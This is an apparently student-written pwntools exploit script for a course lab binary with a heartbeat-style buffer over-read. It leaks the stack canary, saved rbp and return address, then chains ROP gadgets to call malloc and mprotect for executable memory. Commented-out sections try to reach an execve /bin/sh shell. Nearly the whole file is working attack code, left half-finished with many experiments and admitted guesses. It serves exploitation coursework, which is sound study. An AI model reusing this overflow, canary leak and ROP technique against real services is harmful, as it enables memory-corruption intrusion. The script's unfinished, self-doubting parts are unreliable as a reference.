#!/usr/bin/python3
# 2022.09.27.1803.EST
from mmap import mmap
from pwn import *

# void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
# For our purposes the following arguments are desired:
#    mmap(NULL, 0x100*sizeof(char), 0x7, 0x22, 0, 0);
# Prots: PROT_READ | PROT_WRITE | PROT_EXEC = 0x7
# Flags: MAP_PRIVATE | MAP_ANONYMOUS = 0x22
# For fastcall the registers for each argument left to right is: rdi, rsi, rdx, rcx, r8, r9
mmap64 = p64(0x452290)

with gdb.debug("./lab4-3.bin") as p:
#with remote("csc748.hostbin.org", 7043) as p:
    payload = b""
    #payload += b"A"*0x420

    ##payload += b"2048:"
    ##payload += b"A"*1024
    ##payload += b"\n"

    # [NOTE] The additional 16 bytes added to the end of the stack should be to ensure the stack is aligned properly?
    # This doesn't seem to make much sense though because it'd only have to be there to ensure 32 byte alignment
    # Maybe that's it? Because the two integers on the top of the stack take up 16 bytes... I dunno. Maybe?

    # Total stack size is 1024 + 8 + 8 = 1040
    # We need the next 16 bytes after that, or a total of 1056 bytes
    payload += b"1040:"
    #payload += b"A"*1024 + b"B"*8 + b"C"*8
    payload += b"A"*1024
    #payload += p64(0x12345678FFFFFFFF)
    #payload += p64(0x87654321EEEEEEEE)
    payload += b"\n"

    #banner = p.recv()
    #print(banner.decode("utf-8"))
    #banner = p.recv()
    #print(banner.decode("utf-8"))
    #banner = p.recv()
    #print(banner.decode("utf-8"))
    recv = p.recvuntil("Waiting for heart beat request...\n")
    print(recv)

    #p.send(payload)

    #recv = p.recv()
    #recv = p.recv(1024+8+8+16)
    #recv = p.recv(1024+8+8)
    #recv = p.recv(1024)
    #recv = p.recv(16)
    #recv = p.recv()
    #print(recv)

    #p.send(b"2048:" + b"A"*1023 + b"\n")
    #p.send(b"2048:" + b"A"*0x429 + b"\n")
    # Hopefully should be return value for main()
    """
    payload = b""
    payload += b"2048:" + b"A"*1024    # Write until end of data[1024]
    payload += b"B"*32    # This is where the stack canary is
    payload += p64(0x01234567)    # Overflow ebp
    payload += p64(0x89abcdef)    # Write where we want to jump to in memory. This does however fail the stack canary
    payload += b"\n"
    p.send(payload)
    #p.send(b"2048:" + b"A"*1024 + b"B"*32 + p64(0x12345678) + b"\n")
    #recv = p.recv(1024)
    print(recv)

    recv = p.recvuntil("Waiting for heart beat request...\n")
    print(recv)

    # Break out of the do loop
    p.send(b"0:BBBBBBBB" + b"\n")

    p.interactive()
    """

    overflow = b"2048:" + b"A"*1024    # Write until end of data[1024]
    #overflow = b"2048:" + b"A"*1016 + b"/bin/sh\x00"
    #overflow = b"2048:" + b"/bin/sh\x00" + b"A"*1016

    payload_leak = b""
    #payload_leak += b"2048:" + b"A"*1024    # Write until end of data[1024]
    payload_leak += overflow
    payload_leak += b"\n"

    p.send(payload_leak)

    p.read(31)    # printf("Sending heart beat response...\n") is exactly 31 bytes in length
    p.read(1024)    # Length of data[1024]. No need to read all those 'A's
    #p.read(1016)    # Length of data[1024] minus size of bin_sh string. No need to read all those 'A's
    #bin_sh = p.read(8)    # Last 8 bytes of the constructed overflow. [NOTE] Shouldn't actually have to save this, but its nice to have I guess?
    #print("got this value: {}".format(bin_sh))
    p.read(8)    # Stack alignment padding of p64(0x00)
    canary = p.read(8)
    rbp = p.read(8)
    return_addr = p.read(8)

    p.recv()    # Silence the rest of the returned heartbeat

    print(hex(u64(canary)))
    print(hex(u64(rbp)))
    print(hex(u64(return_addr)))

    # 0x58 is pop rax
    # 0x59 is pop rcx
    # 0x5f is pop rdi
    # 0xc3 is ret

    # Found via either [ropper -f file.bin --search "ropGadgetHere"] or radare2's [/R ropGadgetHere]
    # e.g. radare2's [/R pop rcx;ret | less -R], although in this binary this returns nothing really
    # We can use ropper to find our gadgets [ropper -f ./lab4-3.bin --search "gadget search here"]
    gadget_pop_rax = p64(0x451fd7)    # pop rax; ret;
    #gadget_pop_rax = p64(0x49c8ea)    # pop rax; ret; TESTING, this isn't actually a command, but the bytes match at least

    gadget_pop_rdi = p64(0x4018e2)    # pop rdi; ret;
    gadget_pop_rsi = p64(0x40f30e)    # pop rsi; ret;
    gadget_pop_rdx = p64(0x4017ef)    # pop rdx; ret;
    #gadget_pop_rcx = p64(0x??????)    # I can't belive 0x59, 0xc3 doesn't exist AT ALL in the binary...
    gadget_syscall = p64(0x41f5c4)    # syscall; ret;

    # Create a space for my exploit on the heap
    payload_malloc = b""
    payload_malloc += gadget_pop_rdi + p64(0x100)    # Size in bytes? I think?
    payload_malloc += p64(0x427910)    # Happens to be the location of malloc()

    # Set protection level to rwx
    payload_mprotect = b""
    payload_mprotect += gadget_pop_rdi + p64(0x4e4b90)    # Seems malloc will always go to this location (heap)
    payload_mprotect += gadget_pop_rsi + p64(0x100)
    payload_mprotect += gadget_pop_rdx + p64(0x7)    # Prots: PROT_READ | PROT_WRITE | PROT_EXEC = 0x7
    payload_mprotect += p64(0x452370)    # Happens to be the location of mprotect()

    # Now I can write stuff to that section... right?
    #

    # Here we create space on the heap to run our payload. We'll do this with mmap
    #payload_mmap = b""
    #payload_mmap += gadget_pop_rdi + p64(0x00)    # NULL so the kernel will chose a place on the heap for us
    #payload_mmap += gadget_pop_rsi + p64(0x10)    # Length of buffer. 0x10 is small and will be aligned to 0x1000 anyways
    #payload_mmap += gadget_pop_rdx + p64(0x07)    # Prots: PROT_READ | PROT_WRITE | PROT_EXEC = 0x7
    #payload_mmap += gadget_pop_rcx + p64(0x22)    # Flags: MAP_PRIVATE | MAP_ANONYMOUS = 0x22
    #payload_mmap += gadget_pop_r8 += p64(0x00)    # File descriptor, can be nulled out
    #payload_mmap += gadget_pop_r9 += p64(0x00)    # Offset, can be nulled out
    #payload_mmap += mmap64

    #p.send(payload_mmap)

    payload_exploit = b""
    payload_exploit += overflow
    payload_exploit += p64(0x00)    # Account for our stack alignment padding
    payload_exploit += canary
    payload_exploit += rbp    # Not actually needed, this shouldn't affect the exploit in any way regardless
    #payload_exploit += payload_mmap
    payload_exploit += payload_malloc
    payload_exploit += payload_mprotect

#    payload_exploit += p64(0xdeadbeef)

    payload_exploit += b"\n"

    p.send(payload_exploit)

    """
    # Now we need to create our rop chain
    syscall_execvp = 0x3b    # int execvp(char *file, char *argv[], char *envp[])
    RAX = p64(syscall_execvp)
    #RDI = p64(extremely_convenient_string)
    RDI = p64(u64(rbp) - 0x8)    # Length of '/bin/sh\x00' [NOTE] This is where I'm having issues. I need this to persist but it doesn't
    RSI = p64(0)
    RDX = p64(0)

    #gadget_push_rdi = p64(0x4343fe)    # push rdi; ret;    Just incase we wanna push some value... I dunno
    gadget_do_something = p64(0x421938)    # mov qword ptr [rdx], rax; ret;    I dunno what to do with this...
    gadget_xor_rax = p64(0x44c190)    # xor rax, rax; ret;

    gadget_ret = p64(0x40101a)    #ret;

    payload_rop = b""

    #payload_rop += gadget_pop_rax + p64(0x12345678)
    #payload_rop += gadget_pop_rdx + p64(0x4e3000)    # Some place on some r-x location... I dunno
    #payload_rop += gadget_do_something + p64(0x12345678)
    #payload_rop += gadget_xor_rax

    ##payload_rop += gadget_pop_rdi + b"/bin/sh\x00"
    ##payload_rop += gadget_pop_rdi + p64(0xdeadbeef)
    #payload_rop += gadget_pop_rax + RAX
    #payload_rop += gadget_pop_rsi + RSI
    #payload_rop += gadget_pop_rdx + RDX
    #payload_rop += gadget_syscall

    #payload_rop = b"\x90\x90\x90\x90\x90\x90\x90\x90"
    payload_rop += gadget_ret + b"\x31\xc0"

    # Now we throw the exploit
    payload_exploit = b""
    payload_exploit += overflow
    payload_exploit += p64(0x00)    # Account for our stack alignment padding
    payload_exploit += canary
    payload_exploit += rbp    # Not actually needed, this shouldn't affect the exploit in any way regardless
    #payload_exploit += p64(0xFEFEFEFE)    # Should be main()'s return address. [NOTE] rop should go here
    payload_exploit += payload_rop
    #payload_exploit += b"/bin/sh\x00"
    payload_exploit += b"\n"

    p.send(payload_exploit)
    """
    p.recv()    # Silence returned heartbeat

    payload_break_loop = b""
    #payload_break_loop += b"0:/bin/sh\x00"
    payload_break_loop += b"0:AAAAAAAA"
    payload_break_loop += b"\n"

    p.send(payload_break_loop)

    p.interactive()

"""
with gdb.debug("./lab4-3.bin") as p:
#with remote("csc748.hostbin.org", 7043) as p:
    #payload = b"1024" + b":" + b"A"*1024 + b"\n"
    #payload = b"64" + b":" + b"A"*64 + b"\n"
    #payload = b"2048" + b":" + b"A"*1024 + b"\n"
    payload = b"2048" + b":" + b"A"*16 + b"\n"

    banner = p.recv()
    #print(banner.decode("utf-8"))

    p.send(payload)

    response = p.recv()
    prompt_len = 31
    data = response[prompt_len:]    # Sending heart beat response...\n
    data = data[16:]    # Length of actual data sent
    end_len = 35
    data = data[:-end_len]    # \nWaiting for heart beat request...\n

    padding = b"\x00"*0
    data = padding + data

    print(data)

    p.interactive()
"""